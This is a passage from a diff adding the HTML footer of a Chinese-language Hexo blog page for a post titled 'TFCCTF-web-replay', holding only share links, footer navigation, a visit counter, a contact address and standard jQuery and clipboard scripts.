+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&name=TFCCTF-web-replay&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&t=TFCCTF-web-replay"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
